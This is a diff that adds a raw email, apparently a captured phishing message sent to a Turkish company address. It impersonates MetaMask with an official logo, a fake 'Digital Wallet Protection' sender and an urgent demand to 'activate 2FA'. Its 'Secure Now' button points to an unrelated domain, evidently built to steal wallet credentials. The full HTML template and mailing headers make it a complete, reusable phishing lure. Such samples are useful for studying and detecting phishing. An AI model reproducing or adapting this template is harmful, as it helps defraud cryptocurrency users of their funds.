@@ -1,0 +1,74 @@
+Return-Path: <postmaster@9dd0baad19.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id CLgiNhWFPWehDQAAOB6+FQ
+	(envelope-from <postmaster@9dd0baad19.nxcli.io>)
+	for <info@vorteksenerji.com>; Wed, 20 Nov 2024 09:43:33 +0300
+Return-path: <postmaster@9dd0baad19.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Wed, 20 Nov 2024 09:43:33 +0300
+Received: from cloudhost-11129568.us-midwest-2.nxcli.net ([199.189.225.152]:36186)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.96.2)
+	(envelope-from <postmaster@9dd0baad19.nxcli.io>)
+	id 1tDeR3-00014C-25
+	for info@vorteksenerji.com;
+	Wed, 20 Nov 2024 09:43:33 +0300
+Received: (qmail 7954 invoked by uid 10135); 20 Nov 2024 05:22:41 +0000
+Date: 20 Nov 2024 05:22:41 +0000
+Message-ID: <20241120052241.7952.qmail@cloudhost-11129568.us-midwest-2.nxcli.net>
+To: info@vorteksenerji.com
+Subject: =?UTF-8?B?QWN0aXZhdGUgMkZBIHRvIFByZXZlbnQgU2VydmljZSBEaXNydXB0aW9u?=
+X-PHP-Originating-Script: 10135:mail.php
+From: Digital Wallet Protection <9d2647wi@wallet-security-center.org>
+Reply-To: no-reply@example.com
+Content-Type: text/html; charset=UTF-8
+X-Mailer-ID: 673d7221c4b2c
+X-Origin-IP: 192.168.1.149
+X-Message-ID: 90d88039284fa68cff341d0cacc02926
+X-Origin-Time: 2024-11-20 05:22:41
+X-Campaign-ID: 37609f1242567531
+List-Unsubscribe: <mailto:unsubscribe@example.com>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Don’t Risk Your Wallet Access</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
+        .container { max-width: 600px; margin: 20px auto; background: #ffffff; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); overflow: hidden; }
+        .header { background-color: #f6851b; padding: 20px; text-align: center; }
+        .header img { max-width: 100px; height: auto; }
+        .content { padding: 20px; }
+        .content h2 { color: #333; }
+        .content p { line-height: 1.6; color: #555; }
+        .cta { text-align: center; margin: 20px 0; }
+        .cta a { display: inline-block; padding: 15px 25px; color: #ffffff; background-color: #f6851b; text-decoration: none; font-weight: bold; border-radius: 5px; }
+        .cta a:hover { background-color: #e67e22; }
+        .footer { padding: 10px 20px; text-align: center; font-size: 12px; color: #aaa; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/SVG_MetaMask_Icon_Color.svg" alt="MetaMask Logo">
+        </div>
+        <div class="content">
+            <h2>Activate 2FA for Continued Use</h2>
+            <p>Dear User,<br>Ensure your wallet remains accessible by activating Two-Factor Authentication (2FA) immediately. Your account’s security depends on it.</p>
+            <div class="cta">
+                <a href="https://braseabais.info/m/index.php?id=-856369019289761985-3235">Secure Now</a>
+            </div>
+        </div>
+        <div class="footer">
+            <p>© 2024 MetaMask. All rights reserved. This is an automated message. Do not reply.</p>
+        </div>
+    </div>
+</body>
+</html>
+<!-- Random-ID: 673d7221c4b38 -->
